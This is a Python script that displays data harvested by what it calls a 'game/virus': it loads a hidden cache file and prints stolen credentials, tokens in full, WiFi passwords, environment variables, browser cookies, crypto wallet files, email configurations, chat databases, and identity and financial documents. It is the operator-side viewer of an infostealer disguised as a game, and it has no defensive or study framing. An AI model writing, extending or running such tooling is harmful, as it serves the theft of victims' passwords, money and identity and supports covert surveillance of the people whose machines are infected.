#!/usr/bin/env python3
"""
Display all exploited data in clear text
"""
import json
import os
import sys
from datetime import datetime

def show_exploited_data():
    """Display all exploited data in clear text (normalized and deduplicated)"""
    data_file = ".system_cache/normalized_data.json"
    
    # Load normalized data (ONLY FILE - clean, deduplicated, accurate)
    data = None
    
    if os.path.exists(data_file):
        try:
            with open(data_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
        except Exception as e:
            print(f"âŒ Error reading data file: {e}")
            return
    
    if not data:
        print("âŒ No exploited data found!")
        print(f"   File not found: {data_file}")
        print("   Run the game/virus first to collect data.")
        return
    
    print("=" * 80)
    print("EXPLOITED USER DATA (NORMALIZED & DEDUPLICATED)")
    print("=" * 80)
    print()
    
    # Basic info
    print("ğŸ“‹ BASIC INFORMATION")
    print("-" * 80)
    print(f"  Timestamp: {data.get('timestamp', 'N/A')}")
    print(f"  Hostname: {data.get('hostname', 'N/A')}")
    print(f"  User: {data.get('user', 'N/A')}")
    print()
    
    # Unified Credentials (merged from passwords + password_manager_files)
    unified_creds = data.get('unified_credentials', [])
    if unified_creds:
        print(f"ğŸ” UNIFIED CREDENTIALS ({len(unified_creds)} found - merged from passwords + password managers)")
        print("=" * 80)
        for i, cred in enumerate(unified_creds, 1):
            cred_type = cred.get('type', 'unknown')
            source = cred.get('source', 'unknown')
            file_path = cred.get('file_path', 'N/A')
            print(f"\n  [{i}] Type: {cred_type.upper()}")
            print(f"      Source: {source}")
            print(f"      File: {file_path}")
            print(f"      Size: {cred.get('size', 0)} bytes")
            if cred.get('hash'):
                print(f"      Hash: {cred.get('hash')}")
            if cred.get('modified'):
                print(f"      Modified: {cred.get('modified')}")
            print()
        print("=" * 80)
    else:
        print("ğŸ” UNIFIED CREDENTIALS: None found")
        print()
    
    # Unified Files (merged from sensitive_files + config_files)
    unified_files = data.get('unified_files', [])
    if unified_files:
        print(f"ğŸ“ UNIFIED FILES ({len(unified_files)} found - merged from sensitive + config files)")
        print("=" * 80)
        for i, file_info in enumerate(unified_files, 1):
            category = file_info.get('category', 'unknown')
            print(f"\n  [{i}] Category: {category.upper()}")
            print(f"      Path: {file_info.get('path', 'N/A')}")
            print(f"      Size: {file_info.get('size', 0)} bytes")
            print(f"      Modified: {file_info.get('modified', 'N/A')}")
            if file_info.get('hash'):
                print(f"      Hash: {file_info.get('hash')}")
            if file_info.get('content_preview'):
                preview = file_info['content_preview']
                print(f"      Content Preview: {preview[:200]}...")
            print()
        print("=" * 80)
    else:
        print("ğŸ“ UNIFIED FILES: None found")
        print()
    
    # Unified Tokens (merged from application_tokens + development_tokens)
    unified_tokens = data.get('unified_tokens', [])
    if unified_tokens:
        print(f"ğŸ”‘ UNIFIED TOKENS ({len(unified_tokens)} found - merged from application + development tokens)")
        print("=" * 80)
        for i, token in enumerate(unified_tokens, 1):
            token_type = token.get('type', 'unknown')
            service = token.get('service', 'unknown')
            token_value = token.get('token', 'N/A')
            location = token.get('location', 'N/A')
            print(f"\n  [{i}] Type: {token_type.upper()}")
            print(f"      Service: {service}")
            print(f"      Token: {token_value}")
            print(f"      Location: {location}")
            print()
        print("=" * 80)
    else:
        print("ğŸ”‘ UNIFIED TOKENS: None found")
        print()
    
    # Browser Data
    browser_data = data.get('browser_data', {})
    if browser_data:
        print("ğŸŒ BROWSER DATA")
        print("-" * 80)
        print(f"  Cookies: {len(browser_data.get('cookies', []))} files")
        print(f"  History: {len(browser_data.get('history', []))} files")
        print(f"  Bookmarks: {len(browser_data.get('bookmarks', []))} files")
        print(f"  Autofill: {len(browser_data.get('autofill', []))} files")
        print()
        
        # Show cookie files
        if browser_data.get('cookies'):
            print("  Cookie Files:")
            for cookie in browser_data['cookies'][:5]:  # Show first 5
                print(f"    - {cookie.get('browser', 'Unknown')}: {cookie.get('file', 'N/A')}")
            if len(browser_data['cookies']) > 5:
                print(f"    ... and {len(browser_data['cookies']) - 5} more")
            print()
    else:
        print("ğŸŒ BROWSER DATA: None found")
        print()
    
    # WiFi Passwords
    wifi = data.get('wifi_passwords', [])
    if wifi:
        print(f"ğŸ“¶ WIFI PASSWORDS ({len(wifi)} found)")
        print("=" * 80)
        for i, w in enumerate(wifi, 1):
            ssid = w.get('ssid', 'N/A')
            password = w.get('password', 'Not found')
            method = w.get('method', 'Unknown')
            connection_name = w.get('connection_name', '')
            
            print(f"\n  [{i}] Network: {ssid}")
            if connection_name and connection_name != ssid:
                print(f"      Connection Name: {connection_name}")
            print(f"      Password: {password}")
            print(f"      Method: {method}")
            if w.get('source_file'):
                print(f"      Source: {w['source_file']}")
            print()
        print("=" * 80)
    else:
        print("ğŸ“¶ WIFI PASSWORDS: None found")
        print()
    
    # Email Configs (deduplicated)
    emails = data.get('email_configs', [])
    if emails:
        print(f"ğŸ“§ EMAIL CONFIGURATIONS ({len(emails)} found - deduplicated)")
        print("=" * 80)
        for i, email in enumerate(emails, 1):
            print(f"\n  [{i}] Email: {email.get('email', 'N/A')}")
            print(f"      Client: {email.get('client', 'Unknown')}")
            print(f"      Config File: {email.get('config_file', 'N/A')}")
            if email.get('server'):
                print(f"      Server: {email.get('server')}")
            print()
        print("=" * 80)
    else:
        print("ğŸ“§ EMAIL CONFIGURATIONS: None found")
        print()
    
    # Databases
    databases = data.get('databases', [])
    if databases:
        print(f"ğŸ’¾ DATABASE FILES ({len(databases)} found)")
        print("-" * 80)
        for i, db in enumerate(databases[:10], 1):  # Show first 10
            print(f"  {i}. {db.get('path', 'N/A')}")
            print(f"     Size: {db.get('size', 0):,} bytes")
            print(f"     Modified: {db.get('modified', 'N/A')}")
        if len(databases) > 10:
            print(f"  ... and {len(databases) - 10} more")
        print()
    else:
        print("ğŸ’¾ DATABASE FILES: None found")
        print()
    
    # Crypto Wallets
    wallets = data.get('crypto_wallets', [])
    if wallets:
        print(f"ğŸ’° CRYPTOCURRENCY WALLETS ({len(wallets)} found)")
        print("-" * 80)
        for i, wallet in enumerate(wallets, 1):
            print(f"  {i}. Type: {wallet.get('type', 'Unknown')}")
            print(f"     File: {wallet.get('file', 'N/A')}")
            print(f"     Size: {wallet.get('size', 0):,} bytes")
            print()
    else:
        print("ğŸ’° CRYPTOCURRENCY WALLETS: None found")
        print()
    
    # Documents (Excel, PDF, Word, etc.)
    docs = data.get('recent_documents', [])
    if docs:
        print(f"ğŸ“„ DOCUMENTS ({len(docs)} found - Excel, PDF, Word, PowerPoint, etc.)")
        print("=" * 80)
        
        # Group by type
        by_type = {}
        for doc in docs:
            doc_type = doc.get('type', 'unknown')
            if doc_type not in by_type:
                by_type[doc_type] = []
            by_type[doc_type].append(doc)
        
        # Show documents grouped by type
        for doc_type, type_docs in sorted(by_type.items()):
            print(f"\n  ğŸ“‚ {doc_type.upper().replace('_', ' ')} ({len(type_docs)} files)")
            print("-" * 80)
            for i, doc in enumerate(type_docs[:15], 1):  # Show first 15 of each type
                filename = doc.get('filename', os.path.basename(doc.get('path', '')))
                path = doc.get('path', 'N/A')
                size = doc.get('size', 0)
                modified = doc.get('modified', 'N/A')
                
                print(f"  [{i}] {filename}")
                print(f"      Path: {path}")
                print(f"      Size: {size:,} bytes ({size / 1024:.1f} KB)" if size > 0 else "      Size: N/A")
                print(f"      Modified: {modified}")
                
                # Show content preview for text files
                if doc.get('content_preview'):
                    preview = doc['content_preview'][:300]
                    print(f"      Preview: {preview}...")
                print()
            
            if len(type_docs) > 15:
                print(f"  ... and {len(type_docs) - 15} more {doc_type} files")
            print()
        
        print("=" * 80)
    else:
        print("ğŸ“„ DOCUMENTS: None found")
        print()
    
    # System Info
    sys_info = data.get('system_info', {})
    if sys_info:
        print("ğŸ–¥ï¸  SYSTEM INFORMATION")
        print("-" * 80)
        print(f"  Hostname: {sys_info.get('hostname', 'N/A')}")
        print(f"  User: {sys_info.get('user', 'N/A')}")
        print(f"  Home: {sys_info.get('home', 'N/A')}")
        
        env_vars = sys_info.get('environment_variables', {})
        if env_vars:
            print(f"  Environment Variables ({len(env_vars)} sensitive):")
            for key, value in list(env_vars.items())[:5]:
                print(f"    {key} = {value}")
            if len(env_vars) > 5:
                print(f"    ... and {len(env_vars) - 5} more")
        
        if sys_info.get('uptime_seconds'):
            uptime_hours = sys_info['uptime_seconds'] / 3600
            print(f"  Uptime: {uptime_hours:.1f} hours")
        print()
    else:
        print("ğŸ–¥ï¸  SYSTEM INFORMATION: None found")
        print()
    
    # High-Value Data
    financial = data.get('financial_data', [])
    if financial:
        print(f"ğŸ’³ FINANCIAL DATA ({len(financial)} found)")
        print("=" * 80)
        for i, item in enumerate(financial[:10], 1):
            print(f"  [{i}] {item.get('filename', 'N/A')}")
            print(f"      Path: {item.get('path', 'N/A')}")
            print(f"      Size: {item.get('size', 0):,} bytes")
            print()
        if len(financial) > 10:
            print(f"  ... and {len(financial) - 10} more")
        print("=" * 80)
        print()
    
    identity = data.get('identity_documents', [])
    if identity:
        print(f"ğŸ†” IDENTITY DOCUMENTS ({len(identity)} found)")
        print("=" * 80)
        for i, doc in enumerate(identity[:10], 1):
            print(f"  [{i}] {doc.get('filename', 'N/A')}")
            print(f"      Path: {doc.get('path', 'N/A')}")
            print(f"      Type: {doc.get('detected_by', 'unknown')}")
            print()
        if len(identity) > 10:
            print(f"  ... and {len(identity) - 10} more")
        print("=" * 80)
        print()
    
    email_data = data.get('email_contacts_content', {})
    if email_data.get('contacts') or email_data.get('content'):
        print(f"ğŸ“§ EMAIL CONTACTS & CONTENT")
        print("=" * 80)
        print(f"  Contacts: {len(email_data.get('contacts', []))} files")
        print(f"  Messages: {len(email_data.get('content', []))} files")
        print("=" * 80)
        print()
    
    chat = data.get('chat_messages', [])
    if chat:
        print(f"ğŸ’¬ CHAT MESSAGES ({len(chat)} databases found)")
        print("=" * 80)
        for i, msg in enumerate(chat[:10], 1):
            print(f"  [{i}] App: {msg.get('app', 'unknown')}")
            print(f"      Database: {msg.get('filename', 'N/A')}")
            print(f"      Path: {msg.get('path', 'N/A')}")
            print(f"      Size: {msg.get('size', 0):,} bytes")
            print()
        if len(chat) > 10:
            print(f"  ... and {len(chat) - 10} more")
        print("=" * 80)
        print()
    
    # Statistics Summary
    stats = data.get('statistics', {})
    if stats:
        print("=" * 80)
        print("ğŸ“Š DATA STATISTICS SUMMARY")
        print("=" * 80)
        print(f"  ğŸ” Unified Credentials: {stats.get('unified_credentials', 0)}")
        print(f"  ğŸ“ Unified Files: {stats.get('unified_files', 0)}")
        print(f"  ğŸ”‘ Unified Tokens: {stats.get('unified_tokens', 0)}")
        print(f"  ğŸ“¶ WiFi Passwords: {stats.get('wifi_passwords', 0)}")
        print(f"  ğŸ“§ Email Configs: {stats.get('email_configs', 0)}")
        print(f"  ğŸ’¾ Databases: {stats.get('databases', 0)}")
        print(f"  â˜ï¸  Cloud Storage: {stats.get('cloud_storage_configs', 0)}")
        print(f"  ğŸª Browser Cookies: {stats.get('browser_cookies', 0)}")
        print(f"  ğŸ“œ Browser History: {stats.get('browser_history', 0)}")
        print(f"  ğŸ’° Crypto Wallets: {stats.get('crypto_wallets', 0)}")
        print(f"  ğŸ“„ Recent Documents: {stats.get('recent_documents', 0)}")
        print(f"  ğŸ’³ Financial Data: {stats.get('financial_data', 0)}")
        print(f"  ğŸ†” Identity Documents: {stats.get('identity_documents', 0)}")
        print(f"  ğŸ“§ Email Contacts: {stats.get('email_contacts', 0)}")
        print(f"  ğŸ“¨ Email Messages: {stats.get('email_messages', 0)}")
        print(f"  ğŸ’¬ Chat Messages: {stats.get('chat_messages', 0)}")
        print("=" * 80)
        print()
    
    print("=" * 80)
    print("âœ… DATA DISPLAY COMPLETE (NORMALIZED & DEDUPLICATED)")
    print(f"ğŸ“ Data file: .system_cache/normalized_data.json")
    print("=" * 80)

if __name__ == "__main__":
    show_exploited_data()

